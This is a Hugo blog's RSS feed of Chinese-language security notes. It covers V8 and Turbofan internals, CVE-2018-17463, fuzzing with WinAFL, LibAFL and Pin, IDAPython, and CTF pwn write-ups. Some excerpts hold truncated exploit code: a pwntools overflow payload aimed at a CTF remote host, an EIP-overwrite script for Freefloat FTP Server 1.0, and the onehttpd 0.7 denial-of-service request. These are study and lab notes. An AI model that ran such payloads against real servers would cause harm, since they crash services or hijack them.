<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on The Space Between Us</title><link>https://vincebye.github.io/posts/</link><description>Recent content in Posts on The Space Between Us</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 03 Aug 2023 14:23:27 +0800</lastBuildDate><atom:link href="https://vincebye.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>V8_base</title><link>https://vincebye.github.io/posts/v8_base/</link><pubDate>Thu, 03 Aug 2023 14:23:27 +0800</pubDate><guid>https://vincebye.github.io/posts/v8_base/</guid><description>v8 前言 v8是chrome浏览器的JavaScript解析引擎，v8编译后二进制名称叫d8而不是v8
基础知识 介绍了V8中各个组件的功能以及工作流程
解析JS语句的基本流程 ![[Pasted image 20221014222038.png]]
![[Pasted image 20221014222052.png]] v8在读取js语句后，首先将这一条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，经过优化将字节码转换为机器码来执行。
v8读取js语句→语法树→中间语言的Bytecode字节码+优化→机器码 JSArray内存展示 JSArray ElementsKind [1,2,3] PACKED_SMI_ELEMENTS [1,,,,,,2,3] HOLEY_SMI_EMELENTS [1.1,1.2] PACKED_DOUBLE_ELEMENTS [{},1.1,2] PACKED_ELEMENTS JIT优化 为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阀值后，就会将这段语法树直接转换为机器码。后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为ByteCode字节码，这样就大大加快了执行速度
v8对象结构 以上面的数组对象b为例，通过job命令可以看到一个对象在内存中布局大致如下所示：
Untitled
diff代码 diff文件的相关内容
读懂diff
V8调试 v8 中内置了一些 runtime 函数，可以在启动 d8 时追加--allow-natives-syntax参数来启动内置函数的使用。 %PrepareFunctionForOptimization 是 v8 众多内置函数中的其中一个。该函数可以为 JIT 优化函数前做准备，确保 JSFunction 存在 FeedbackVector等相关的结构（在必要时甚至会先编译该函数）。
// 调用链如下 Runtime_PrepareFunctionForOptimization bool EnsureFeedbackVector(Handle&amp;lt;JSFunction&amp;gt; function) void JSFunction::EnsureFeedbackVector(Handle&amp;lt;JSFunction&amp;gt; function) 由于该内置函数只是为对应的 JSFunction 准备 FeedbackVector（请记住这个准备操作），因此可以通过多次调用目标函数来准备 FeedbackVector，替换该内置函数的调用。
内存结构 elements ----&amp;gt; +------------------------+ | MAP +&amp;lt;---------+ +------------------------+ | | element 1 | | +------------------------+ | | element 2 | | | .</description></item><item><title>Turbofan</title><link>https://vincebye.github.io/posts/turbofan/</link><pubDate>Thu, 03 Aug 2023 14:23:01 +0800</pubDate><guid>https://vincebye.github.io/posts/turbofan/</guid><description>启动 turbolizer。如果原先版本的 turbolizer 无法使用，则可以使用在线版本的 turbolizer v8.1
前言 准备Turbolizer Turbolizer:调试TurboFan的sea of nodes图的工具
cd tools/turbolizer npm i npm run-script build python -m SimpleHTTPServer 执行JS文件带&amp;ndash;trace-turbo会生成.cfg和.json文件（用来提供给Turbolizer生成各种优化图)
在JS执行过程中，首先由ignition生成字节码，如果JS中的函数被执行很多次，Turbofan会生成优化代码
Sea of nodes节点海 Turbofan运行方式可以由节点海来表示，节点可以表示数学运算、加载、存储、调用、常数等，以下为三种常用来描述节点的边
Control edges控制边 表示分支和循环 ![[Pasted image 20221019215734.png]]
Value edges值边 表示数据依赖 ![[Pasted image 20221019215837.png]]
Effect edges影响边 影响边排序操作，如读取或者写入状态 在下图中obj[x]=obj[x]+1
在写入之前你需要先读取x的值，所以在load和store之间有一个影响边 在store之前，有一个增加操作，所以需要在load和+之间设置一个影响边 最后影响链load-&amp;gt;add-&amp;gt;store如下所示 ![[Pasted image 20221019220258.png]] Phases各个阶段 以下函数为例
function opt_me() { let x = Math.random(); let y = x + 2; return y + 3; } Graph builder phase 生成图形，JSCall对应Math.</description></item><item><title>CVE 2018 17463</title><link>https://vincebye.github.io/posts/cve-2018-17463/</link><pubDate>Thu, 03 Aug 2023 14:22:08 +0800</pubDate><guid>https://vincebye.github.io/posts/cve-2018-17463/</guid><description>V8环境搭建（Windows） 按照这个在Windows下安装V8 https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159 遇到了一些问题：
首先是CMD设置代理，用set xxxx 其次需要安装Python2.7 再次需要VS2017，~~缺少了一个DIA SDK的东西，我直接从VS2022处复制过来，~~原文方法更简单。不知道为什么没有看见，原文直接在VS2022处运行安装程序，有一个VS2017构建程序安装选项 缺少Windows Kits 10 10134版本，去https://developer.microsoft.com/zh-cn/windows/downloads/sdk-archive/下载 如报win32file的错，将build/toolchain/win/tool_wrapper.py文件按照https://chromium-review.googlesource.com/c/chromium/src/+/1962898/1/build/toolchain/win/tool_wrapper.py#26替换
重叠属性 搜索脚本
// Create object with one line and 32 out-of-line properties function makeObj() { let obj = {inline: 1234}; for (let i = 1; i &amp;lt; 32; i++) { Object.defineProperty(obj, &amp;#39;p&amp;#39; + i, { writable: true, value: -i }); } return obj; } // Find a pair of properties where p1 is stored at the same offset // in the FixedArray as p2 is in the NameDictionary function findOverlappingProperties() { // Create an array of all 32 property names such as p1.</description></item><item><title>CodeAlchemist</title><link>https://vincebye.github.io/posts/codealchemist/</link><pubDate>Thu, 03 Aug 2023 14:20:50 +0800</pubDate><guid>https://vincebye.github.io/posts/codealchemist/</guid><description>CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines论文阅读 论文解决问题 JS Engine Fuzzer很难生成语法和语义正确的测试样本，本篇试图减少运行错误，生成语法语义正确的测试样本 文章主要内容 JS Engine Fuzzer很难生成语法和语义正确的测试样本，本篇试图减少运行错误，生成语法语义正确的测试样本，提出了一个新的模型assembly constraint 模型结构 Seed Parse:切割JS文件生成code bricks 解析JS文件到一个AST，将AST分割成一系列code bricks,切割粒度为语句 Constraint analyzer:给每个code bricks打标签，组成一个code brick pool 通过标准化code bricks的所有特征，精简code bricks，将精简后的code bricks通过数据流分析得出use-def作为每一个code brick的约束标签 engine fuzzer:基于code bricks的标签约束关系从code brick pool生成测试样本 定义的名词 code bricks:切割的JS种子文件片段 assembly constraint:每一个code bricks都有一系列约束标签，后续根据这些标签来对code bricks进行组合 改进方向 优化种子选择策略（CodeAlchemist直接基于现有的种子） 优化code brick选择策略 code利用的黑盒方式，可参考灰盒根据代码覆盖率或者相似差 与Skyfire和TreeFuzz的概率语言模型结合 支持更多目标 C、C++ 相关知识 JS 7种原始类型 Undefined,Null,String,Boolean,Symbol,Number,Object ECMAScript标准 5种原始运行错误 syntax error,range error,reference error,type error,URI error,其他的称为custom error 实验对象 Chakra,v8,JavaScriptCore,SpiderMonkey 开源地址 https://github.</description></item><item><title>AAAAAA</title><link>https://vincebye.github.io/posts/test/</link><pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate><guid>https://vincebye.github.io/posts/test/</guid><description>Test plugin
name: GitHub Pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-latest concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: &amp;#39;0.111.3&amp;#39; # 是否启用 hugo extend extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: ${{ github.</description></item><item><title>Rust调用C代码</title><link>https://vincebye.github.io/posts/rust%E8%B0%83%E7%94%A8c%E4%BB%A3%E7%A0%81/</link><pubDate>Sun, 16 Apr 2023 18:02:42 +0800</pubDate><guid>https://vincebye.github.io/posts/rust%E8%B0%83%E7%94%A8c%E4%BB%A3%E7%A0%81/</guid><description>#Rust
Rust 可以通过外部函数接口调用（Foreign Function Interface, FFI）来调用 C 代码。FFI 是一种通用的机制，可以使不同语言之间的函数相互调用。在 Rust 中，使用 FFI 机制可以调用 C 语言编写的库。 具体来说，Rust 通过以下步骤来调用 C 代码：
在 Rust 代码中声明 C 函数签名：在 Rust 代码中声明一个函数签名，其参数和返回值应该与 C 代码中的函数签名一致。这个函数签名可以使用 extern &amp;quot;C&amp;quot; 关键字进行声明，这样 Rust 就可以使用 C 语言的调用约定来调用这个函数。 使用 Rust 绑定链接 C 库：在 Rust 代码中使用 extern crate 或 use 关键字来引用 C 库的 Rust 绑定，使得 Rust 可以访问 C 库中的函数和类型定义。 在 Rust 代码中调用 C 函数：在 Rust 代码中使用声明的 C 函数签名来调用 C 函数。在调用之前，需要使用 unsafe 关键字将代码块标记为不安全的，因为在调用 C 函数时，Rust 编译器无法保证代码的安全性。 在 Rust 中调用外部 C 代码时，需要将 C 代码编译成 Rust 可以链接的静态库或动态库。这是因为 Rust 代码和 C 代码使用的编译器和链接器可能不同，需要通过编译成中间格式的静态库或动态库来进行链接。在 Rust 中，可以使用 cc crate 来编译 C 代码并生成静态库或动态库。在上述代码中，cc::Build::new().</description></item><item><title>Winafl使用记录</title><link>https://vincebye.github.io/posts/winafl%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link><pubDate>Fri, 14 Apr 2023 16:01:06 +0800</pubDate><guid>https://vincebye.github.io/posts/winafl%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid><description>[[#测试DynamoRIO是否插桩成功|测试DynamoRIO是否插桩成功]] [[#乱乱写|乱乱写]] [[#Patch程序|Patch程序]] [[#监控CPU占用|监控CPU占用]] [[#命令行Fuzzing|命令行Fuzzing]] [[#命令行Fuzzing#问题|问题]] [[#DLL Fuzzing|DLL Fuzzing]] [[#Harness|Harness]] [[#思路|思路]] 安装&amp;amp;使用说明 cmake
-G &amp;lt;generator-name&amp;gt; 指定构建系统生成器。 CMake可能在某些平台上支持多个本机构建系统。生成器负责生成特定的构建系统。可能的生成器名称在 cmake-generators(7) 手册。 如果未指定，CMake将检查 CMAKE_GENERATOR 环境变量，否则将退回到内置的默认选择。 -A &amp;lt;platform-name&amp;gt; 如果生成器支持，请指定平台名称。 一些CMake生成器支持将平台名称提供给本机构建系统以选择编译器或SDK。见 CMAKE_GENERATOR_PLATFORM 变量以获取详细信息。 下载 WINAFL：https://github.com/googleprojectzero/winafl
下载DynamoRIO：https://github.com/DynamoRIO/dynamorio/releases
下载后把二者解压到同一文件夹下，如 Fuzzing，手动编译 x64环境
I:\\Fuzzing&amp;gt;cd winafl I:\\Fuzzing\\winafl&amp;gt;mkdir build64 I:\\Fuzzing\\winafl&amp;gt;cd build64 if VS2022 cmake -G &amp;#34;Visual Studio 17 2022&amp;#34; -A x64 .. -DDynamoRIO_DIR=D:\\fuzzing\\DynamoRIO\\cmake -DUSE_COLOR=1 cmake --build . --config Release if VS2019 cmake -G&amp;#34;Visual Studio 16 2019&amp;#34; -A x64 .. -DDynamoRIO_DIR=I:\\Fuzzing\\dynamorio\\cmake cmake --build .</description></item><item><title>Pin学习记录</title><link>https://vincebye.github.io/posts/pin%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</link><pubDate>Thu, 13 Apr 2023 16:34:00 +0800</pubDate><guid>https://vincebye.github.io/posts/pin%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</guid><description>#插桩
环境 windows Make&amp;amp;GCC&amp;amp;G++
安装cygwin
安装勾选gcc-core g++ make 在devel类别里
然后将bin目录加入path
编译测试项目
64位
使用x64 Native Tools Command Prompt for VS 2019
cd C:\\pin\\source\\tools\\ManualExamples make all TARGET=intel64 32位
使用x86 Native Tools Command Prompt for VS 2019，修改C:\pin\source\tools\Config\win.vars中添加一行 cd C:\\pin\\source\\tools\\ManualExamples make all VS集成Pin 在VS中选择工具→外部工具→Add
运行 Examples Simple Instruction Count （指令插桩） 统计执行过的指令的总数
/* * Copyright (C) 2004-2021 Intel Corporation. * SPDX-License-Identifier: MIT */ #include &amp;lt;iostream&amp;gt; #include &amp;lt;fstream&amp;gt; #include &amp;#34;pin.H&amp;#34; using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // The running count of instructions is kept here // make it static to help the compiler optimize docount static UINT64 icount = 0; // This function is called before every instruction is executed //每个指令执行之前运行这个函数 VOID docount() { icount++; } // Pin calls this function every time a new instruction is encountered //每遇到一条指令，运行一次这个函数 VOID Instruction(INS ins, VOID* v) { // Insert a call to docount before every instruction, no arguments are passed //在每条指令运行之前插入一个函数来计数，没有参数传递 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END); } KNOB&amp;lt; string &amp;gt; KnobOutputFile(KNOB_MODE_WRITEONCE, &amp;#34;pintool&amp;#34;, &amp;#34;o&amp;#34;, &amp;#34;inscount.</description></item><item><title>IDAPython自动化代码</title><link>https://vincebye.github.io/posts/idapython%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81/</link><pubDate>Wed, 12 Apr 2023 15:22:00 +0800</pubDate><guid>https://vincebye.github.io/posts/idapython%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81/</guid><description>#IDA
单个脚本执行
C:\\Study\\BinaryAnalyse&amp;gt;C://Pwn/IDA/ida64.exe -LC:/mylog.log -c -A -S&amp;#34;C://Study/BinaryAnalyse/analyse.py&amp;#34; C://Study/BinaryAnalyse/datas/crackme0x03.exe PS:Windows注意-S后的脚本名称需要添加双引号
c 表示对要分析的二进制文件生成一个新的IDB文件。 -A表示以autonomous模式运行，如果不加这个选项，则会弹出图形界面。 -S 制定要执行的 plugin script。 批量执行
//analyse.py import idc import idautils import idaapi from collections import defaultdict def analysis(): pass # 这里是分析的代码 def main(): &amp;#34;&amp;#34;&amp;#34; 控制器 &amp;#34;&amp;#34;&amp;#34; idc.auto_wait() # 等IDA分析完后才执行 analysis() idc.qexit(0) # 关闭IDA if __name__ == &amp;#34;__main__&amp;#34;: main() 批量
//run.py # -*- coding:utf-8 -*- # =======Import ======= import os import subprocess #C:\\Study\\BinaryAnalyse\\datas #C:\\Pwn\\IDA Pro 7.6 dir_path = &amp;#34;C://Study/BinaryAnalyse/datas/&amp;#34; # 原始数据的文件夹 ida64_path = &amp;#34;C://Pwn/IDA/ida64.</description></item><item><title>LibAFL Introduce</title><link>https://vincebye.github.io/posts/libafl-introduce/</link><pubDate>Wed, 12 Apr 2023 00:38:17 +0800</pubDate><guid>https://vincebye.github.io/posts/libafl-introduce/</guid><description>#Fuzzer #Rust
序 前置知识 Rust Fuzzing LibAFL介绍 LibAFL：为了解决大量的fuzzer工具重复工作的问题，将fuzzer拆分成多个部分，编写fuzzer只需要将其组装，如输入可以改成字节输入或者AST输入，不需要重新安装熟悉多个fuzzer。缺点就是Rust门槛比较高。
资源 LibAFL Book：https://aflplus.plus/libafl-book/libafl.html 项目：https://github.com/AFLplusplus/LibAFL
正文 baby_fuzzer 官方给出的一个简单案例用来说明如何使用LibAFL，我们摘取一部分,以下就是一个简单的fuzzer代码，看着很复杂，不如直接AFL++一把梭。
// Create an observation channel using the signals map let observer = unsafe { StdMapObserver::from_mut_ptr(&amp;#34;signals&amp;#34;, SIGNALS_PTR, SIGNALS.len()) }; // Feedback to rate the interestingness of an input let mut feedback = MaxMapFeedback::new(&amp;amp;observer); // A feedback to choose if an input is a solution or not let mut objective = CrashFeedback::new(); // create a State from scratch let mut state = StdState::new( // RNG StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance InMemoryCorpus::new(), // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer OnDiskCorpus::new(PathBuf::from(&amp;#34;.</description></item><item><title>AAAAAA</title><link>https://vincebye.github.io/posts/test22/</link><pubDate>Tue, 03 Aug 2021 14:16:54 +0800</pubDate><guid>https://vincebye.github.io/posts/test22/</guid><description>Test plugine
name: GitHub Pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-latest concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: &amp;#39;0.111.3&amp;#39; # 是否启用 hugo extend extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: ${{ github.</description></item><item><title>ADWorld 1</title><link>https://vincebye.github.io/posts/adworld-1/</link><pubDate>Tue, 03 Aug 2021 14:16:54 +0800</pubDate><guid>https://vincebye.github.io/posts/adworld-1/</guid><description>forgot from pwn import * context.log_level=&amp;#39;debug&amp;#39; #sentence 32 00000074 #_DWORD v3[10] 00000054 #hackme 080486CC #v5=1 #sentence=&amp;#39;{*&amp;#39; #p=process(&amp;#39;./forgot&amp;#39;) p=remote(&amp;#39;111.200.241.244&amp;#39;,49781) payload=b&amp;#39;{&amp;#39;*32+p32(0x080486CC) p.sendlineafter(&amp;#39;name&amp;#39;,&amp;#39;vincebye&amp;#39;) p.sendlineafter(&amp;#39;validate&amp;#39;,payload) p.interactive() 找到溢出点→覆盖已有的函数
未果01-Mary_Morton 看起来是有两个漏洞入口可以攻击
__int64 sub_4008EB() { char buf; // [sp+0h] [bp-90h]@1 __int64 v2; // [sp+88h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); memset(&amp;amp;buf, 0, 0x80uLL); read(0, &amp;amp;buf, 0x7FuLL); printf(&amp;amp;buf, &amp;amp;buf); return *MK_FP(__FS__, 40LL) ^ v2; } .text:00000000004008EB ; =============== S U B R O U T I N E ======================================= .</description></item><item><title>ADWorld 0</title><link>https://vincebye.github.io/posts/adworld-0/</link><pubDate>Tue, 03 Aug 2021 14:14:45 +0800</pubDate><guid>https://vincebye.github.io/posts/adworld-0/</guid><description>get_shell 直接nc连接上去，然后cat flag
Hello_Pwn pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000400520 puts@plt 0x0000000000400530 setbuf@plt 0x0000000000400540 system@plt 0x0000000000400550 alarm@plt 0x0000000000400560 read@plt 0x0000000000400570 __libc_start_main@plt 0x0000000000400580 __gmon_start__@plt 查看一下main函数
; DATA XREF from entry0 @ 0x4005ad ┌ 104: int main (int argc, char **argv, char **envp); │ 0x0040069b 55 push rbp │ 0x0040069c 4889e5 mov rbp, rsp │ 0x0040069f bf3c000000 mov edi, 0x3c ; &amp;#39;&amp;lt;&amp;#39; ; 60 │ 0x004006a4 e8a7feffff call sym.imp.alarm │ 0x004006a9 488b05a80920.</description></item><item><title>Freefloat_FTP_Server1.0</title><link>https://vincebye.github.io/posts/freefloat_ftp_server1.0/</link><pubDate>Mon, 06 Apr 2020 14:18:31 +0800</pubDate><guid>https://vincebye.github.io/posts/freefloat_ftp_server1.0/</guid><description>0x00 基本介绍 此处以Freefloat FTP Server1.0为例
测试软件：Freefloat FTP Server1.0 虚拟机：Windows XP Pro Sp3 工具：Immunity Debugger、Pwntools、Metasploit 0x01 溢出 #测试脚本 from pwn import * p = remote(&amp;#34;192.168.137.128&amp;#34;, 21) payload = &amp;#39;A&amp;#39;*500 p.sendline(payload) p.interactive() !https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3998ca97-30bd-4a8a-9dfc-dab229c82dd4/Untitled.png
EIP被覆盖为41414141，即AAAA，如果将这个AAAA替换成我们准备好的指令地址，就能执行任意指令，同时我们需要知道这个指令覆盖的偏移量，即这500个字符哪四个字符刚好可以覆盖EIP的位置。
0x02 偏移量 Mona #生成500个垃圾字符 !mona pc 500 //Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 替换原有的垃圾字符
from pwn import * p = remote(&amp;#34;192.168.137.128&amp;#34;, 21) #payload = &amp;#39;A&amp;#39;*500 payload =&amp;#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4&amp;#39; p.sendline(payload) p.interactive() 重新运行溢出脚本：EIP=34694133
!mona po 34694133 #found in cyclic pattern at position 251 偏移量为251
0x03 跳板技术JMP ESP 查找jmp esp地址</description></item><item><title>OneHttpd_0.7空指针引用拒绝服务漏洞</title><link>https://vincebye.github.io/posts/onehttpd_0.7%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</link><pubDate>Fri, 03 Apr 2020 14:20:12 +0800</pubDate><guid>https://vincebye.github.io/posts/onehttpd_0.7%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</guid><description>OneHttpd 0.7空指针引用拒绝服务漏洞 漏洞情况 WinXP Pro
Windbg
IDA
OneHttpd 0.7
https://www.exploit-db.com/exploits/27553
漏洞复现 #!/usr/bin/env python # Exploit Title: onehttpd 0.7 Denial of Service # Date: 12 Aug 2013 # Exploit Author: superkojiman - http://www.techorganic.com # Vendor Homepage: https://code.google.com/p/onehttpd/ # Version: onehttpd 0.7 # Tested on: Windows 7 Ultimate English # Windows XP SP2 English # from socket import * buf = ( b&amp;#34;GET /\xFF HTTP/1.1\r\n&amp;#34; + b&amp;#34;Host: 192.168.137.129\r\n&amp;#34; + b&amp;#34;\r\n&amp;#34; ) s = socket(AF_INET, SOCK_STREAM) s.</description></item></channel></rss>